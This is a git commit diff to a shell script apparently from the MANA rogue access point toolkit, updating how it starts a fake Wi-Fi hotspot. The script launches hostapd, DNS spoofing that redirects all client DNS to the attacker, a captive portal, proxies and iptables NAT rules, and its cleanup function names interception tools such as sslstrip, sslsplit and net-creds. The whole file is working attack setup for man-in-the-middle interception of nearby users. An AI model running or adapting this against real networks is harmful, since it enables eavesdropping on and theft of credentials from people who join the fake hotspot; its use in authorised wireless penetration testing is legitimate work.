57b546bb99a280a32cb08adc2a2b6a005576edc5
j0nk0 <aboutcontact@gmail.com>
2018-05-28 03:01:06 +0200

    Update

--- run-mana/start-noupstream.sh
+++ run-mana/start-noupstream.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-
+set -x
 phy=wlan0
 conf=/etc/mana-toolkit/hostapd-mana.conf
 hostapd=/usr/lib/mana-toolkit/hostapd
@@ -11,13 +11,21 @@ sleep 2
 #service network-manager stop
 rfkill unblock wlan
 
-ifconfig $phy down
-macchanger -r $phy
-ifconfig $phy up
+#ifconfig $phy down
+#macchanger -r $phy
+#ifconfig $phy up
 
 sed -i "s/^interface=.*$/interface=$phy/" $conf
 sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/mana-toolkit/karmetasploit.rc
-$hostapd $conf&
+#$hostapd $conf&
+
+#  $nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
+  sleep 9
+#echo "Starting hostapd"
+hostapd /etc/hostapd/hostapd.conf&
+# ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
+  sleep 5
+
 sleep 5
 ifconfig $phy 10.0.0.1 netmask 255.255.255.0
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
@@ -27,19 +35,61 @@ dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
 service apache2 start
 stunnel4 /etc/mana-toolkit/stunnel.conf
 tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
-msfconsole -r /etc/mana-toolkit/karmetasploit.rc& #Remove "&" to fix msfconsole exiting 
+#msfconsole -r /etc/mana-toolkit/karmetasploit.rc& #Remove "&" to fix msfconsole exiting 
+echo "Starting nodogsplash"
+nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
-iptables --policy INPUT ACCEPT
-iptables --policy FORWARD ACCEPT
-iptables --policy OUTPUT ACCEPT
-iptables -F
-iptables -t nat -F
+#iptables --policy INPUT ACCEPT
+#iptables --policy FORWARD ACCEPT
+#iptables --policy OUTPUT ACCEPT
+#iptables -F
+#iptables -t nat -F
 iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 iptables -A FORWARD -i $phy -o eth0 -j ACCEPT
-#iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+##iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+killem(){
+        echo "[*] Killing...."
+        service apache2 stop
+
+        pkill -f airbase
+        pkill -f dhcpd
+        pkill -f start_dnsmasq
+        pkill -f dnsspoof
+        pkill -f dnsmasq
+        pkill -f dns2proxy
+        pkill -f firelamb
+        pkill -f start_firelamb
+        pkill -f hostapd
+        pkill -f start_hostapd
+#        pkill -f msfconsole
+#        pkill -f start_msfconsole
+        pkill -f start_nat_firewall
+        pkill -f net-creds
+        pkill -f nodogsplash
+#        pkill -f python
+#        pkill -f ruby
+        pkill -f sslsplit
+        pkill -f sslstrip
+        pkill -f stunnel4
+        pkill -f tinyproxy
+
+        rm --verbose --force $EXNODE
+        rm --verbose --force /tmp/crackapd.run
+
+        iptables --policy INPUT ACCEPT
+        iptables --policy FORWARD ACCEPT
+        iptables --policy OUTPUT ACCEPT
+        iptables -t nat -F
+echo "Dont forget to kill msfconsole"
+exit
+}
+
 echo "Hit enter to kill me"
 read
+killem
+
 pkill hostapd
 pkill dnsmasq
 pkill dnsspoof
